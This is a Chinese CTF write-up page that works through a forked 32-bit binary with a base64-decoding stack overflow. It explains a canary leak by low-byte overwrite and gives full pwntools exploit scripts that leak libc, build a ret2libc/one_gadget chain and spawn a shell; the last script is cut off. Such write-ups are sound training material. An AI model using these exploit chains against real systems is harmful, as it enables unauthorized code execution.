<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
<meta name="theme-color" content="#222">
<meta name="generator" content="Hexo 5.4.0">
  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
  <link rel="mask-icon" href="/images/logo.svg" color="#222">

<link rel="stylesheet" href="/css/main.css">


<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
  <link rel="stylesheet" href="//cdn.jsdelivr.net/gh/fancyapps/fancybox@3/dist/jquery.fancybox.min.css">

<script id="hexo-configurations">
    var NexT = window.NexT || {};
    var CONFIG = {"hostname":"example.com","root":"/","scheme":"Gemini","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":true,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}}};
  </script>

  <meta property="og:type" content="website">
<meta property="og:title" content="Pwn进你的心">
<meta property="og:url" content="http://example.com/page/30/index.html">
<meta property="og:site_name" content="Pwn进你的心">
<meta property="og:locale" content="en_US">
<meta property="article:author" content="yhellow">
<meta name="twitter:card" content="summary">

<link rel="canonical" href="http://example.com/page/30/">


<script id="page-configurations">
  // https://hexo.io/docs/variables.html
  CONFIG.page = {
    sidebar: "",
    isHome : true,
    isPost : false,
    lang   : 'en'
  };
</script>

  <title>Pwn进你的心</title>
  






  <noscript>
  <style>
  .use-motion .brand,
  .use-motion .menu-item,
  .sidebar-inner,
  .use-motion .post-block,
  .use-motion .pagination,
  .use-motion .comments,
  .use-motion .post-header,
  .use-motion .post-body,
  .use-motion .collection-header { opacity: initial; }

  .use-motion .site-title,
  .use-motion .site-subtitle {
    opacity: initial;
    top: initial;
  }

  .use-motion .logo-line-before i { left: initial; }
  .use-motion .logo-line-after i { right: initial; }
  </style>
</noscript>

</head>

<body itemscope itemtype="http://schema.org/WebPage">
  <div class="container use-motion">
    <div class="headband"></div>

    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
      <div class="header-inner"><div class="site-brand-container">
  <div class="site-nav-toggle">
    <div class="toggle" aria-label="Toggle navigation bar">
      <span class="toggle-line toggle-line-first"></span>
      <span class="toggle-line toggle-line-middle"></span>
      <span class="toggle-line toggle-line-last"></span>
    </div>
  </div>

  <div class="site-meta">

    <a href="/" class="brand" rel="start">
      <span class="logo-line-before"><i></i></span>
      <h1 class="site-title">Pwn进你的心</h1>
      <span class="logo-line-after"><i></i></span>
    </a>
  </div>

  <div class="site-nav-right">
    <div class="toggle popup-trigger">
    </div>
  </div>
</div>




<nav class="site-nav">
  <ul id="menu" class="main-menu menu">
        <li class="menu-item menu-item-home">

    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>Home</a>

  </li>
        <li class="menu-item menu-item-tags">

    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>Tags</a>

  </li>
        <li class="menu-item menu-item-categories">

    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>Categories</a>

  </li>
        <li class="menu-item menu-item-archives">

    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>Archives</a>

  </li>
  </ul>
</nav>




</div>
    </header>

    
  <div class="back-to-top">
    <i class="fa fa-arrow-up"></i>
    <span>0%</span>
  </div>


    <main class="main">
      <div class="main-inner">
        <div class="content-wrap">
          

          <div class="content index posts-expand">
            
      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
    <link itemprop="mainEntityOfPage" href="http://example.com/2022/01/04/canary%E7%88%86%E7%A0%B4%E6%9C%AA%E9%81%82+%E6%95%B0%E6%8D%AE%E6%8E%A5%E6%94%B6%E6%8A%80%E5%B7%A7/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="yhellow">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Pwn进你的心">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2022/01/04/canary%E7%88%86%E7%A0%B4%E6%9C%AA%E9%81%82+%E6%95%B0%E6%8D%AE%E6%8E%A5%E6%94%B6%E6%8A%80%E5%B7%A7/" class="post-title-link" itemprop="url">canary爆破未遂+数据接收技巧</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>

              <time title="Created: 2022-01-04 22:03:51" itemprop="dateCreated datePublished" datetime="2022-01-04T22:03:51+08:00">2022-01-04</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">Edited on</span>
                <time title="Modified: 2022-01-05 20:22:32" itemprop="dateModified" datetime="2022-01-05T20:22:32+08:00">2022-01-05</time>
              </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">In</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/Pwn-train/" itemprop="url" rel="index"><span itemprop="name">Pwn train</span></a>
                </span>
            </span>

          
            <span class="post-meta-item" title="Symbols count in article">
              <span class="post-meta-item-icon">
                <i class="far fa-file-word"></i>
              </span>
              <span>6.7k</span>
            </span>
            <span class="post-meta-item" title="Reading time">
              <span class="post-meta-item-icon">
                <i class="far fa-clock"></i>
              </span>
              <span>6 mins.</span>
            </span>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <p>今天遇到一个题目，有canary并且在循环中用fork生成子进程，当时想都没有想就开始canary爆破，仔细分析代码后才发现出题人的阴险，先用fork引诱我进行canary爆破，等我把爆破脚本写好了再搞我一手，我现在真的怀疑这人是学社工的</p>
<p>通过学习其他大佬的WP，我了解到了一种新的接受数据的方式</p>
<p>这种方式在程序使用“printf”进行输出的时候还挺好用的</p>
<hr>
<p><strong>canary爆破未遂+数据接收技巧</strong></p>
<p><img src="/2022/01/04/canary%E7%88%86%E7%A0%B4%E6%9C%AA%E9%81%82+%E6%95%B0%E6%8D%AE%E6%8E%A5%E6%94%B6%E6%8A%80%E5%B7%A7/1641288175862.png" alt="1641288175862">  </p>
<p>循环输入</p>
<p><img src="/2022/01/04/canary%E7%88%86%E7%A0%B4%E6%9C%AA%E9%81%82+%E6%95%B0%E6%8D%AE%E6%8E%A5%E6%94%B6%E6%8A%80%E5%B7%A7/1641287256715.png" alt="1641287256715"> </p>
<p><img src="/2022/01/04/canary%E7%88%86%E7%A0%B4%E6%9C%AA%E9%81%82+%E6%95%B0%E6%8D%AE%E6%8E%A5%E6%94%B6%E6%8A%80%E5%B7%A7/1641287265290.png" alt="1641287265290"> </p>
<p>32位，dynamically，开了NX，开了canary</p>
<p><img src="/2022/01/04/canary%E7%88%86%E7%A0%B4%E6%9C%AA%E9%81%82+%E6%95%B0%E6%8D%AE%E6%8E%A5%E6%94%B6%E6%8A%80%E5%B7%A7/1641288063874.png" alt="1641288063874"> </p>
<p><img src="/2022/01/04/canary%E7%88%86%E7%A0%B4%E6%9C%AA%E9%81%82+%E6%95%B0%E6%8D%AE%E6%8E%A5%E6%94%B6%E6%8A%80%E5%B7%A7/1641288075846.png" alt="1641288075846"> </p>
<p><img src="/2022/01/04/canary%E7%88%86%E7%A0%B4%E6%9C%AA%E9%81%82+%E6%95%B0%E6%8D%AE%E6%8E%A5%E6%94%B6%E6%8A%80%E5%B7%A7/1641288084647.png" alt="1641288084647"> </p>
<p><strong>代码分析</strong></p>
<p>getchar接受到“Y”后程序继续执行，然后getchar接收“Y”之后的字符（防止溢出）</p>
<p>fork函数执行以后，程序就把它自己复制了一遍，并且优先执行新进程</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span>）在父进程中，fork返回新创建子进程的进程ID</span><br><span class="line"><span class="number">2</span>）在子进程中，fork返回<span class="number">0</span></span><br><span class="line"><span class="number">3</span>）如果出现错误，fork返回一个负值</span><br></pre></td></tr></table></figure>
<p>也就是说，返回“0”的子进程会进入函数“sub_8048B29”，而父进程不会</p>
<p>父进程会进行循环，源源不断地产生子进程</p>
<p>参考：<a target="_blank" rel="noopener" href="https://www.cnblogs.com/love-jelly-pig/p/8471206.html">fork()函数详解</a></p>
<p><img src="/2022/01/04/canary%E7%88%86%E7%A0%B4%E6%9C%AA%E9%81%82+%E6%95%B0%E6%8D%AE%E6%8E%A5%E6%94%B6%E6%8A%80%E5%B7%A7/1641289340337.png" alt="1641289340337"> </p>
<p>子进程会触发函数“read”，输入“0x200”字节到“malloc”分配的空间“buf”</p>
<p><img src="/2022/01/04/canary%E7%88%86%E7%A0%B4%E6%9C%AA%E9%81%82+%E6%95%B0%E6%8D%AE%E6%8E%A5%E6%94%B6%E6%8A%80%E5%B7%A7/1641289574670.png" alt="1641289574670"> </p>
<p>for循环会一直增加“i”的值，直到条件成立，然后“buf[i]”会被赋值为“0”</p>
<p>并且“i”必须为“4”的倍数（包括“0”）</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">100</span>):</span><br><span class="line">    data = i &amp; <span class="number">3</span></span><br><span class="line">    <span class="built_in">print</span>(data)</span><br></pre></td></tr></table></figure>
<p>把“buf”赋值给“dest”后返回“1”，后面就是一个算法，通过一系列的位移操作使四个变成三个字符</p>
<p>​        // 其实就是base64加密</p>
<p><strong>入侵思路</strong></p>
<p><img src="/2022/01/04/canary%E7%88%86%E7%A0%B4%E6%9C%AA%E9%81%82+%E6%95%B0%E6%8D%AE%E6%8E%A5%E6%94%B6%E6%8A%80%E5%B7%A7/1641290228902.png" alt="1641290228902"> </p>
<p><img src="/2022/01/04/canary%E7%88%86%E7%A0%B4%E6%9C%AA%E9%81%82+%E6%95%B0%E6%8D%AE%E6%8E%A5%E6%94%B6%E6%8A%80%E5%B7%A7/1641291871253.png" alt="1641291871253"> </p>
<p>“buf”和“dest”都在堆中，那么溢出点在那里呢？</p>
<p><img src="/2022/01/04/canary%E7%88%86%E7%A0%B4%E6%9C%AA%E9%81%82+%E6%95%B0%E6%8D%AE%E6%8E%A5%E6%94%B6%E6%8A%80%E5%B7%A7/1641292428016.png" alt="1641292428016"> </p>
<p><img src="/2022/01/04/canary%E7%88%86%E7%A0%B4%E6%9C%AA%E9%81%82+%E6%95%B0%E6%8D%AE%E6%8E%A5%E6%94%B6%E6%8A%80%E5%B7%A7/1641292662924.png" alt="1641292662924"> </p>
<p>程序把“dest”进行加密，赋值给“v21”了</p>
<p>“dest”可以装“0x200”字节，而“v21”只能装“258”字节，计算得溢出了</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0x200</span> * <span class="number">3</span> / <span class="number">4</span> = <span class="number">384</span> &gt; <span class="number">269</span> <span class="comment">#在IDA上看的偏移  </span></span><br></pre></td></tr></table></figure>
<p>接下来就是考虑泄露Canary</p>
<p>一般程序涉及到“进程”和“线程”的时候，就会出现两种对应的canary绕过手段，前者为“canary爆破”，后者为“覆盖TLS”，这里使用前者</p>
<p>因为函数“fork”产生的字进程完全克隆父进程，canary也一样，所以这里可以采用canary爆破的方式，一字节一字节爆破canary</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">3</span>): <span class="comment">#32位为‘3’,64位为‘7’</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0x100</span>):</span><br><span class="line">        p.send( padding + canary + <span class="built_in">chr</span>(i)) <span class="comment">#从0~0xFF，依次注入</span></span><br><span class="line">        a = p.recvuntil(<span class="string">&#x27;xxxx&#x27;</span>)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;xxxx&#x27;</span> <span class="keyword">in</span> a: </span><br><span class="line">            canary += <span class="built_in">chr</span>(i)</span><br><span class="line">            <span class="keyword">break</span></span><br></pre></td></tr></table></figure>
<p>重点就是这个“xxxx”写什么，程序的输出就只有这3种情况：</p>
<p>1.子进程正常结束：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">May be I can know <span class="keyword">if</span> you give me some data[Y/N]</span><br><span class="line">Y</span><br><span class="line">Give me some datas:</span><br><span class="line"></span><br><span class="line"><span class="number">1233</span></span><br><span class="line">Result <span class="keyword">is</span>:�m�</span><br><span class="line">Finish!</span><br><span class="line"></span><br><span class="line">May be I can know <span class="keyword">if</span> you give me some data[Y/N]</span><br></pre></td></tr></table></figure>
<p>2.子进程触发canary：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">May be I can know <span class="keyword">if</span> you give me some data[Y/N]</span><br><span class="line">Y</span><br><span class="line">Give me some datas:</span><br><span class="line"></span><br><span class="line">bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb</span><br><span class="line">Result <span class="keyword">is</span>:m��m��m��m��m��m��m��m��m��m��m��m��m��m��m��m��m��m��m��m��m��m��m��m��m��m��m��m��m��m��m��m��m��m��m��m��m��m��m��m��m��m��m��m��m��m��m��m��m��m��m��m��m��m��m��m��m��m��m��m��m��m��m��m��m��m��m��m��m��m��m��m��m��m��m��m��m��m��m��m��m��m��m��m��m��m��m��m��m��m�ۻ��<span class="number">4</span>�</span><br><span class="line">*** stack smashing detected ***: terminated</span><br><span class="line"></span><br><span class="line">May be I can know <span class="keyword">if</span> you give me some data[Y/N]</span><br></pre></td></tr></table></figure>
<p>3.子进程报错：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">May be I can know <span class="keyword">if</span> you give me some data[Y/N]</span><br><span class="line">Y</span><br><span class="line">Give me some datas:</span><br><span class="line"></span><br><span class="line">bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb</span><br><span class="line">Something <span class="keyword">is</span> wrong</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">May be I can know <span class="keyword">if</span> you give me some data[Y/N]</span><br></pre></td></tr></table></figure>
<p>总结归纳一下：</p>
<p>接收字符串中有“Finish”：当前字符串正确</p>
<p>接收字符串中有“wrong”：程序长度不对</p>
<p>不管canary是否正确，只要长度不对，程序就会输出一样的东西，这一点完美卡死了canary爆破，后来发现canary可以用“覆盖低字节的方式”打印出来（”\n”覆盖”\x00”，这里是printf，所以不覆盖也可以）</p>
<p>​        // 原本想用新学的canary爆破练练手，没想到被出题人制裁了</p>
<p>这采用常规接收数据的方式：（直接计算）</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">p.recvuntil(<span class="string">&quot;Give me some datas:\n&quot;</span>) <span class="comment">#这里必须加&quot;\n&quot;</span></span><br><span class="line">payload=<span class="string">b&#x27;a&#x27;</span>*<span class="built_in">int</span>(<span class="number">258</span>*<span class="number">4</span>/<span class="number">3</span>)</span><br><span class="line">p.sendine(payload)</span><br><span class="line">p.recvline() <span class="comment">#接收了&#x27;\n&#x27;（&#x27;\n&#x27;用printf打印出来的时候占一整排，用recvline接收正好）</span></span><br><span class="line">canary =p.recv()[<span class="number">268</span>:<span class="number">271</span>] <span class="comment">#len(&#x27;Result is:&#x27;)+258，接收3字节（没有&quot;\x00&quot;）</span></span><br><span class="line">canary=<span class="string">&quot;\x00&quot;</span>+canary</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;canary &gt;&gt; &quot;</span> +canary)</span><br></pre></td></tr></table></figure>
<p>还有一种更骚的操作：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">p.recvuntil(<span class="string">&quot;Give me some datas:&quot;</span>) <span class="comment">#这里可以不加&quot;\n&quot;</span></span><br><span class="line">payload=  base64.b64encode(<span class="string">&#x27;A&#x27;</span>*<span class="number">258</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line"><span class="built_in">print</span>(p.recv())	<span class="comment">#输出接收到的数据</span></span><br><span class="line">recv= p.recv()</span><br><span class="line">canary = <span class="string">&#x27;\x00&#x27;</span>+recv[recv.rfind(<span class="string">&#x27;AAAAAA&#x27;</span>)+<span class="number">6</span>:recv.rfind(<span class="string">&#x27;AAAAAA&#x27;</span>)+<span class="number">9</span>]</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;canary &gt;&gt; &quot;</span> +canary) <span class="comment">#rfind()返回字符串最后一次出现的位置</span></span><br></pre></td></tr></table></figure>
<p>我目前还不能理解这种收集数据的方式，但是它看起来还挺实用的，以后再研究</p>
<p>本题是给了libc库的，所以这么打：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> * </span><br><span class="line"><span class="keyword">import</span> binascii     </span><br><span class="line"><span class="keyword">import</span> base64  </span><br><span class="line">p=process(<span class="string">&#x27;./pwns&#x27;</span>)</span><br><span class="line">libc= ELF(<span class="string">&#x27;/lib/i386-linux-gnu/libc.so.6&#x27;</span>)</span><br><span class="line">elf=ELF(<span class="string">&#x27;./pwns&#x27;</span>)</span><br><span class="line">context(arch=<span class="string">&#x27;i386&#x27;</span>,os=<span class="string">&#x27;linux&#x27;</span>)</span><br><span class="line"></span><br><span class="line">setbuf_got= elf.got[<span class="string">&#x27;setbuf&#x27;</span>]</span><br><span class="line">puts_plt = elf.plt[<span class="string">&#x27;puts&#x27;</span>] </span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&quot;May be I can know if you give me some data[Y/N]&quot;</span>)</span><br><span class="line">p.sendline(<span class="string">&#x27;Y&#x27;</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;Give me some datas:\n&quot;</span>) <span class="comment">#注意：这里要多收集一个&quot;\n&quot;</span></span><br><span class="line">payload=<span class="string">b&#x27;a&#x27;</span>*<span class="built_in">int</span>(<span class="number">258</span>*<span class="number">4</span>/<span class="number">3</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.recvline() </span><br><span class="line">canary =p.recv()[<span class="number">268</span>:<span class="number">271</span>] </span><br><span class="line">canary=<span class="string">&quot;\x00&quot;</span>+canary</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;canary &gt;&gt; &quot;</span> +canary)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&quot;May be I can know if you give me some data[Y/N]&quot;</span>)</span><br><span class="line">p.sendline(<span class="string">&#x27;Y&#x27;</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;Give me some datas:&quot;</span>)</span><br><span class="line">payload = base64.b64encode(<span class="string">&#x27;A&#x27;</span>*<span class="number">257</span>+canary+<span class="string">&#x27;A&#x27;</span>*<span class="number">12</span>+p32(puts_plt)+<span class="string">&#x27;A&#x27;</span>*<span class="number">4</span>+p32(setbuf_got))</span><br><span class="line"><span class="comment">#程序用base64对输入值进行了加密，所以这里需要进行解密</span></span><br><span class="line">p.sendline(payload)</span><br><span class="line"><span class="built_in">print</span> p.recv()</span><br><span class="line">recv= p.recv()</span><br><span class="line"><span class="built_in">print</span> recv</span><br><span class="line">setbuf_addr = u32(recv[recv.rfind(<span class="string">&#x27;AAAAAA&#x27;</span>)+<span class="number">7</span>:recv.rfind(<span class="string">&#x27;AAAAAA&#x27;</span>)+<span class="number">11</span>])</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;setbuf_addr &gt;&gt; &quot;</span>+<span class="built_in">str</span>(setbuf_addr))</span><br><span class="line"></span><br><span class="line">system_offset=libc.symbols[<span class="string">&quot;system&quot;</span>] </span><br><span class="line">setbuf_offset=libc.symbols[<span class="string">&quot;setbuf&quot;</span>]</span><br><span class="line">system_addr=setbuf_addr+system_offset-setbuf_offset</span><br><span class="line"></span><br><span class="line">binsh_offset=<span class="number">0x192352</span>	</span><br><span class="line"><span class="comment">#strings -a -tx /lib/i386-linux-gnu/libc.so.6 | grep &quot;/bin/sh&quot; (直接输出16进制)</span></span><br><span class="line">binsh_addr = setbuf_addr+binsh_offset-setbuf_offset</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&quot;May be I can know if you give me some data[Y/N]&quot;</span>)</span><br><span class="line">p.sendline(<span class="string">&#x27;Y&#x27;</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;Give me some datas:&quot;</span>)</span><br><span class="line">payload = base64.b64encode(<span class="string">&#x27;A&#x27;</span>*<span class="number">257</span>+canary+<span class="string">&#x27;A&#x27;</span>*<span class="number">12</span>+p32(system_addr)+<span class="string">&#x27;A&#x27;</span>*<span class="number">4</span>+p32(binsh_addr))</span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<p>网上还有一个更nb的，自己找libc版本：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line">context(terminal = [<span class="string">&#x27;gnome-terminal&#x27;</span>, <span class="string">&#x27;-x&#x27;</span>, <span class="string">&#x27;sh&#x27;</span>, <span class="string">&#x27;-c&#x27;</span>], arch = <span class="string">&#x27;i386&#x27;</span>, os = <span class="string">&#x27;linux&#x27;</span>, log_level = <span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">debug</span>(<span class="params">addr = <span class="string">&#x27;0x08048B09&#x27;</span></span>):</span></span><br><span class="line">    raw_input(<span class="string">&#x27;debug:&#x27;</span>)</span><br><span class="line">    gdb.attach(io, <span class="string">&quot;b *&quot;</span> + addr)</span><br><span class="line"></span><br><span class="line">local_MAGIC = <span class="number">0x0003AC69</span></span><br><span class="line"></span><br><span class="line">io = process(<span class="string">&#x27;/home/h11p/hackme/huxiangbei/pwns&#x27;</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span>*<span class="number">0x102</span></span><br><span class="line">io.recvuntil(<span class="string">&#x27;May be I can know if you give me some data[Y/N]\n&#x27;</span>)</span><br><span class="line">io.sendline(<span class="string">&#x27;Y&#x27;</span>)</span><br><span class="line">io.recvuntil(<span class="string">&#x27;Give me some datas:\n&#x27;</span>)</span><br><span class="line">io.send(base64.b64encode(payload))</span><br><span class="line">io.recvline()</span><br><span class="line">myCanary=io.recv()[<span class="number">268</span>:<span class="number">271</span>]</span><br><span class="line">Canary=<span class="string">&quot;\x00&quot;</span>+myCanary</span><br><span class="line"><span class="built_in">print</span> <span class="string">&quot;Canary:&quot;</span>+<span class="built_in">hex</span>(u32(Canary))</span><br><span class="line"></span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span>*<span class="number">0x151</span></span><br><span class="line">io.recvuntil(<span class="string">&#x27;May be I can know if you give me some data[Y/N]\n&#x27;</span>)</span><br><span class="line">io.sendline(<span class="string">&#x27;Y&#x27;</span>)</span><br><span class="line">io.recvuntil(<span class="string">&#x27;Give me some datas:\n&#x27;</span>)</span><br><span class="line">io.send(base64.b64encode(payload))</span><br><span class="line">io.recvline()</span><br><span class="line">mylibc=io.recv()[<span class="number">347</span>:<span class="number">351</span>] <span class="comment">#直接开gdb看出来的</span></span><br><span class="line">base_libc=u32(mylibc)-<span class="number">0x18637</span></span><br><span class="line"><span class="built_in">print</span> <span class="string">&quot;mylibc_addr:&quot;</span>+<span class="built_in">hex</span>(base_libc)</span><br><span class="line"></span><br><span class="line">MAGIC_addr=local_MAGIC+base_libc <span class="comment">#这个MAGIC是one_gadget</span></span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span>*<span class="number">0x101</span>+Canary+<span class="string">&quot;a&quot;</span>*<span class="number">0xc</span>+p32(MAGIC_addr) </span><br><span class="line">io.recvuntil(<span class="string">&#x27;May be I can know if you give me some data[Y/N]\n&#x27;</span>)</span><br><span class="line">io.sendline(<span class="string">&#x27;Y&#x27;</span>)</span><br><span class="line">io.recvuntil(<span class="string">&#x27;Give me some datas:\n&#x27;</span>)</span><br><span class="line">io.send(base64.b64encode(payload))</span><br><span 